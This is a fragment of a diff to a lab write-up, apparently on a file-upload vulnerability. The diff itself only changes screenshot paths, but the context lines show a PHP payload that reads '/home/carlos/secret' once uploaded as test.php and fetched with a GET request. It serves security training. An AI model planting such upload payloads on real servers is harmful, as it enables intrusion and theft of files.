@@ -51,9 +51,9 @@ now do **\_\_\_\_**
 
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 
-![screenshot](./images/lab2_change_file_name_and_php_code.png)
+![screenshot](images/lab2_change_file_name_and_php_code.jpg)
 
 and ### step2
 send get request for test.php file
 
-![screenshot](./images/lab2_get_request_test_php_file.png)
+![screenshot](images/lab2_get_request_test_php_file.jpg)
